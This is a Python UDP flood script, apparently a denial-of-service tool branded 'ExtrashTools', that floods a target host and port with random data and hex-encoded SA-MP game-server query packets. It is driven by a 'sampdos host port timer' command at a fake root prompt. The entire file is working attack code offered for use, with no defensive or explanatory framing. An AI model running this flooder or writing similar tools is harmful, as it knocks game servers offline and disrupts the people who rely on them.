import socket, struct, codecs, sys, threading, random, time, os ,getpass

attack = True
running = 0
atks = 0
 
banner = """
 _._     _,-'""`-._       Join us \u001b[31mExtrash Comunity\033[0m
(,-.`._,'(       |\`-/|       discord.gg/\u001b[31mdFCVD2aU2E\033[0m
    `-.-' \ )-`( , o o)
          `-    \`_`"'-


"""

def sampdos(host, port, timer):
	global atks
	global running
	
	Attack = [
	codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
	codecs.decode('081e62da', 'hex_codec'),
	codecs.decode('081e77da', 'hex_codec'),
	codecs.decode('081e4dda', 'hex_codec'),
	codecs.decode('021efd40', 'hex_codec'),
	codecs.decode('081e7eda', 'hex_codec')]
	
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		data = os.urandom(min(577, 1000, 1204, 1024, 999, 666, 1460, 818, 1080, 1800))
		packets = random._urandom(1021)
		packet = random._urandom(1490)
		pack = random._urandom(666)
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(pack, (host, int(port)))
		sock.sendto(packet, (host, int(port)))
		sock.sendto(packets, (host, int(port)))
		if int(port) == 7777:
			sock.sendto(Attack[5], (host, int(port)))
		elif int(port) == 7796:
			sock.sendto(Attack[4], (host, int(port)))
		elif int(port) == 7771:
			sock.sendto(Attack[6], (host, int(port)))
		elif int(port) == 7784:
			sock.sendto(Attack[7], (host, int(port)))
	atks -= 1
	running -= 1
	

def main():
	global atks
	global running
	
	while True:
		sys.stdout.write("\x1b]2;[@] ExtrashTools. | User & Password: [root@admin]\x07")
		sin = input("root@admin: ~$ ")
		sinput = sin.split(" ")[0]
		if sinput == "sampdos":
			try:
				if running >= 1:
					print("\033[0mYou have reached your concurrents limit and must wait for your cooldown period to end.\n")
					main()
				else:
						sinput, host, port, timer = sin.split(" ")
						threading.Thread(target=sampdos, args=(host, port, timer)).start()
						print("\033[0m[INFO] Request has been sent to all servers.\n")
			except ValueError:
				main()

try:
	os.system('cls' if os.name == 'nt' else 'clear')
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
